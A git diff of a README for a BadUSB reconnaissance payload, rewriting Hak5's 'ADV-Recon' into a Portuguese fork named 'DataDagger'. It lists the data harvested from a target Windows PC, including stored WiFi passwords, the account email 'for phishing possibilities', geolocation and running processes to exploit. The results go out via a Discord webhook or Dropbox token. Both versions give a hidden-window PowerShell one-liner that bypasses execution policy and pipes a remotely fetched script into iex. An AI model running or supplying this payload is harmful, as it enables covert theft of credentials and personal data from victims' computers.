@@ -1,145 +1,110 @@
-![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)
+![Logo](https://i.ibb.co/1rpRChk/mini-mini-TH.png)
 
 <!-- TABLE OF CONTENTS -->
 <details>
   <summary>Table of Contents</summary>
   <ol>
-    <li><a href="#Description">Description</a></li>
-    <li><a href="#getting-started">Getting Started</a></li>
-    <li><a href="#Contributing">Contributing</a></li>
-    <li><a href="#Version-History">Version History</a></li>
-    <li><a href="#Contact">Contact</a></li>
-    <li><a href="#Acknowledgments">Acknowledgments</a></li>
+    <li><a href="#Descrição">Descrição</a></li>
+    <li><a href="#Vamos Começar">Vamos Começar</a></li>
+    <li><a href="#Compatibilidade">Compatibilidade</a></li>
+    <li><a href="#Histórico de Versões">Histórico de Versões</a></li>
+    <li><a href="#Contacto">Contacto</a></li>
+    <li><a href="#Conhecimentos">Conhecimentos</a></li>
   </ol>
 </details>
 
-# ADV-Recon
+# DataDagger
 
-A script used to do an advanced level of recon on the target's computer.
+Script de reconhecimento avançado a um computador alvo, capaz de mostrar muita informação sensível
 
-Version 2 no longer requires you to host your own version of the script.
+## Descrição
 
-Modifying the execution script is the only necessary interaction.
+Este programa foi desenvolvido para coletar o máximo de dados possível para fins de reconhecimento. Isso inclui
 
-## Description
+* Hosts versão do PowerShell (para saber quais comandos podem ser executados)
+* Nome associado à conta da Microsoft
+* Estejam eles no grupo Admin ou não
+* O e-mail associado à conta da Microsoft (para possibilidades de phishing)
+* A geolocalização (saber localização aproximada)
+* Redes Wifi próximas (possível movimento lateral)
+* Informações de rede (endereço IP local e público; endereço MAC; RDP ativado?)
+* Perfis WLAN (lista de SSIDs e passwords armazenadas no PC)
+* Interfaces de rede (com o que elas estão ligadas)
+* Informações do sistema (fabricante, modelo, número de série, sistema operacional, CPU, RAM, BIOS da placa-mãe)
+* Utilizadores locais (contas no sistema com nome de usuário, nome associado à conta microsoft e SID)
+* Informações sobre os discos rígidos 
+* Dispositivos COM e seriais ( dispositivo ligados ou emparelhados com o PC)
+* Conexões TCP ativas (varredura de porta)
+* Processos, serviços, software e drivers (o que está a ser executado no computador e  que podemos explorar? processos ativos/parados)
+* Informações sobre as especifições sobre o PC
+* Lista de programas do PC
+* Tree (exploração de toda a tree do PC)
+## Vamos Começar
 
-This program enumerates a target PC to collect as much recon data as possible for future engagements. This includes:
+### Compatibilidade
 
-* Hosts PowerShell Version (to know what commands can be run)
-* Name associated with their Microsoft account (Or ENV UserName variable if one is not detected)
-* Whether they are in the Admin group or not
-* The email associated with their Microsoft account (for phishing possibilities)
-* Other User accounts on their system (for possible privilege escalation)
-* Details on their login settings (Ex: Min/Max password age and length)
-* How many days since they have changed their password (Max password age - Days since = Opportunity)
-* Their GeoLocation (know their approximate where abouts)
-* Nearby Wifi Networks (Possible lateral movement)
-* Network Info (Local and Public IP Address; MAC Address; RDP Enabled?)
-* WLAN Profiles (List of SSIDs and Passwords stored on their PC)
-* Network Interfaces (What are they connecting in and out with)
-* System Information (Manufacturer, Model, Serial Number, OS, CPU, RAM, Mainboard BIOS)
-* Local Users (Accounts on system with Username, name associated with microsoft account and SID)
-* Information on their hard drives (Indicator of Recon Scope)
-* COM and Serial Devices (Is there a device connected you can manipulate?)
-* Active TCP Connections (Poor mans Port Scanning)
-* Processes, Services, Software, and Drivers (What is running on the computer we can exploit?)
-* Video Card info (how much vroom vroom?)
-* Tree Command (Gain a more accurate assessment of what to exfil or use in Phishing attacks)
-
-## Getting Started
-
-### Dependencies
-
-* Dropbox or Discord
+* Dropbox ou Discord
 * Windows 10,11
 
-<p align="right">(<a href="#top">back to top</a>)</p>
+<p align="right">(<a href="#top">voltar</a>)</p>
 
-### Executing program
+### Execução
+* Conectar ao dispositivo
+* Esperar alguns segundos e verificar o Discord
 
-* Plug in your device
-* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
+`$dc` é a variável que guarda no webhook do discord 
 
-`$dc` is the variable that stores your discord webhook 
+`$db` é a variável que guarda na dropbox 
 
-`$db` is the variable that stores your dropbox token 
-
-Fill in either or both of these two methods to exfil your collected data
-
+Um destes deve ser prenchido para os dados serem recolhidos
 ```
-powershell -w h -NoP -Ep Bypass $dc='';$db='';irm jakoby.lol/9nb | iex
+powershell -w h -NoP -Ep Bypass $dc='';$db='';irm bit.ly/ClankPT | iex
 ```
 
-<p align="right">(<a href="#top">back to top</a>)</p>
+<p align="right">(<a href="#top">voltar</a>)</p>
 
-## Contributing
+## Contribuição
 
-All contributors names will be listed here
+* Clank
 
-I am Jakoby
+* Luís Lopes
 
-<p align="right">(<a href="#top">back to top</a>)</p>
+* Tiago Casal
 
-## Version History
+<p align="right">(<a href="#top">voltar</a>)</p>
+
+## Histórico de Versões
 
 * 0.1
-    * Initial Release
+    * Ainda em desenvolvimento ...
 
-* 0.2
-    * Added additional data queries
-    * Optimized output of data
-
-<p align="right">(<a href="#top">back to top</a>)</p>
+<p align="right">(<a href="#top">voltar</a>)</p>
 
 <!-- CONTACT -->
-## Contact
+## Contacto
 
 <h2 align="center">📱 My Socials 📱</h2>
 <div align=center>
 <table>
   <tr>
     <td align="center" width="96">
-      <a href="https://youtube.com/c/IamJakoby?sub_confirmation=1">
-        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/youtube-svgrepo-com.svg width="48" height="48" alt="C#" />
-      </a>
-      <br>YouTube
-    </td>
-    <td align="center" width="96">
-      <a href="https://twitter.com/I_Am_Jakoby">
-        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/twitter.png width="48" height="48" alt="Python" />
-      </a>
-      <br>Twitter
-    </td>
-    <td align="center" width="96">
-      <a href="https://www.instagram.com/i_am_jakoby/">
-        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/insta.png width="48" height="48" alt="Golang" />
-      </a>
-      <br>Instagram
-    </td>
-    <td align="center" width="96">
-      <a href="https://discord.gg/MYYER2ZcJF">
+      <a href="https://discord.gg/4BURDrRMBZ">
         <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
       </a>
       <br>Discord
     </td>
-    <td align="center" width="96">
-      <a href="https://www.tiktok.com/@i_am_jakoby?lang=en">
-        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/img/tiktok.svg width="48" height="48" alt="Jsonnet" />
-      </a>
-      <br>TikTok
-    </td>    
   </tr>
 </table>
 </div>
 
 
 
-<p align="right">(<a href="#top">back to top</a>)</p>
+<p align="right">(<a href="#top">voltar</a>)</p>
 
 <!-- ACKNOWLEDGMENTS -->
-## Acknowledgments
+## Conhecimentos
 
 * [Hak5](https://hak5.org/)
 * [MG](https://github.com/OMG-MG)
 
-<p align="right">(<a href="#top">back to top</a>)</p>
+<p align="right">(<a href="#top">voltar</a>)</p>
